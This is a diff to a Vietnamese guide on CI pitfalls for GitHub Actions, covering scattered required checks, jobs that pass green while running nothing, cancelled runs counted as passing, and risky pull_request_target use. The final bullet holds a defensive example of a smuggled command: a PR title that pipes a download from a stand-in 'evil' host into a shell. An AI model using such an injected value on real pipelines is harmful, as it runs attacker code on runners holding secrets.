@@ -98,7 +98,7 @@ Dự án đích không phải tự viết (`WF-CI-024`, `WF-CI-001`): `install.p
 ## Bẫy thường gặp
 
 - **Nhiều required check rời rạc.** Thêm/đổi tên job → ruleset lệch → nhánh khoá hoặc cổng hở. Một `quality` gom + `protection-guard` đối chiếu (cộng `gitleaks`, `dep-audit`, `merge-gate`).
-- **CI "xanh rỗng".** Job skip khi chưa có `package.json` (khung cũ) hoặc `if:` sai → mọi thứ xanh mà không chạy gì. `quality` phải fail khi job con `skipped` ngoài quy tắc; smoke "cổng chặn được lỗi" ở G5.
+- **CI "xanh rỗng".** Job skip khi chưa có `package.json` (khung cũ) hoặc `if:` sai → mọi thứ xanh mà không chạy gì. `quality` phải fail khi job con `skipped` ngoài quy tắc; smoke "cổng chặn được lỗi" ở G5. Cùng bẫy ở mức lệnh: khoá `lint`/`test` rỗng trong `xt.yaml` làm job in "skip" và xanh — CI mẫu có bước `dev-task.sh require lint test` đỏ tới khi khai lệnh thật (D-096).
 - **`quality` với `if: ${{ !cancelled() }}`.** Run bị huỷ (push mới, hết giờ) → `quality` `skipped` → GitHub tính required check đạt → auto-merge merge mã chưa qua test. Dùng `always()` và đỏ khi job con ≠ `success` (`WF-CI-001`, `WF-CI-024`).
 - **`pull_request_target` + checkout PR head.** PR từ fork chạy code lạ với secrets. Không checkout code PR trong trigger có quyền.
 - **Nội suy title PR vào `run:`.** Title `"; curl evil | sh` chạy trên runner. Qua `env:` và quote.
